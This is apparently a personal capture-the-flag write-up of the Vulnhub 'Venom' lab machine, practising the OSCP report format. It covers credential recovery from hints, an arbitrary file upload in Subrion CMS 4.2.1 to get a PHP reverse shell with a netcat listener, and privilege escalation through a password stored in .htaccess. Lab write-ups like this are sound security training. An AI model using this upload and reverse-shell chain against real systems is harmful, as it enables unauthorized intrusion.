Venom is a boot2root machine from vulnhub. I am practicing for my OSCP, and thats what it's decription says it is for so... I will try to loosely follow the exam report format for practice.

### Information Gathering:

Target: `192.168.56.111`

### Service Enumeration:

It feels weird to put this first, but anyway here we go:

| Server IP Address | Ports Open | Service/Banner |
|-------------------|------------|----------------|
| 192.168.56.111    | 21,80,443  | ftp / http / https |


### Report - Penetration

Again, it feels weird to put this first, spoilers I guess.

**Vulnerability Exploited**: Subrion CMS 4.2.1 - Arbitrary File Upload

**System Vulnerable**: 192.168.56.111

**Vulnerability Explanation**: Subrion CMS suffers from an arbitrary file upload that can lead to Remote Code Execution and allow for a low privilege shell to be obtained. 

In upload directory, .htaccess did not prevent execution of the files that have the pht and phar extensions. As a result, they are able to execute as PHP script.

**Privilege Escalation Vulnerability**: Information Exposure - password in unprotected file

**Vulnerability Fix**: Update .htaccess file. Remove password from unprotected file.

**Severity**: High

### Information Gathering:

Full nmap scan on all ports:

![nmap scan](/assets/images/venom/21.png)

In the page source on the index page on port 80 we find the following:

![index page](/assets/images/venom/22.png)

This is likely a hash, for speed we look it up, and find:

![hash](/assets/images/venom/23.png)

Since it says this will give us access to something, we try and use it to login with FTP. Log in with the credentials `hostinger:hostinger` on FTP, and get the `hint.txt` file.

![ftp](/assets/images/venom/3.png)

In the `hint.txt` file we have:
```
	Hey there... 

T0D0 --

* You need to follow the 'hostinger' on WXpOU2FHSnRVbWhqYlZGblpHMXNibHBYTld4amJWVm5XVEpzZDJGSFZuaz0= also aHR0cHM6Ly9jcnlwdGlpLmNvbS9waXBlcy92aWdlbmVyZS1jaXBoZXI=
* some knowledge of cipher is required to decode the dora password..
* try on venom.box
password -- L7f9l8@J#p%Ue+Q1234 -> deocode this you will get the administrator password 


Have fun .. :)
```

- `WXpOU2FHSnRVbWhqYlZGblpHMXNibHBYTld4amJWVm5XVEpzZDJGSFZuaz0=` decodes to `standard vignere cipher`, and `aHR0cHM6Ly9jcnlwdGlpLmNvbS9waXBlcy92aWdlbmVyZS1jaXBoZXI=` decodes to 
`https://cryptii.com/pipes/vigenere-cipher`.
- since it says to follow 'hostinger', we assume this is the key.
- we assume `dora` is the username
- we get `dora:E7r9t8@Q#h%Hy+M1234`

We add `venom.box` to `/etc/hosts`:

```
sudo vim /etc/hosts
[SNIPPED]
192.168.56.111  venom.box
```

Navigate to `venom.box/panel` and login as `dora`

![login](/assets/images/venom/26.png)

Navigate to Contents > Uploads to access the upload UI:

![upload ui](/assets/images/venom/6.png)

Start a netcat listener:
```
nc -nlvp 1234
```

With ![http://pentestmonkey.net/tools/php-reverse-shell](pentestmonkey's php-reverse-shell), change the extension to `.phar`, and the ip to your ip:
```
$ip = '192.168.56.1';
```

Drag and drop the file into the uploads box. Right-click it, and select "get info", then click on the Link:

![file](/assets/images/venom/24.png)

In the netcat listener we have a connection:

![nc listener](/assets/images/venom/27.png)

We find there is a user hostinger
```
$ ls /home/
hostinger   nathan
```
We log in as that user using the ftp credentials `hostinger:hostinger`:
```
$ su hostinger
Password: hostinger
```
We check there bash_history, and find that they have accessed the file .htaccess and then logged in as nathan. We find the password for nathan in that file:

![htaccess](/assets/images/venom/13.png)

We log in as nathan:
```
hostinger@venom:~$ su nathan
su nathan
Password: FzN+f2-rRaBgvALzj*Rk#_JJYfg8XfKhxqB82x_a

nathan@venom:/home/hostinger$ 
```

We find the user flag:

![user flag](/assets/images/venom/17.png)

We check nathan's root permissions:
```
nathan@venom:~$ sudo -l
sudo -l
[sudo] password for nathan: FzN+f2-rRaBgvALzj*Rk#_JJYfg8XfKhxqB82x_a

Matching Defaults entries for nathan on venom:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nathan may run the following commands on venom:
    (root) ALL, !/bin/su
    (root) ALL, !/bin/su
```

We get a root shell:
![getting root](/assets/images/venom/18.png)

We get the root flag:

![root flag](/assets/images/venom/20.png)

### Report - House Cleaning:

- Delete the reverse shell file from the directory uploads

FIN.
Hope you enjoyed my terrible arrows. I am definitely gonna fail ;).
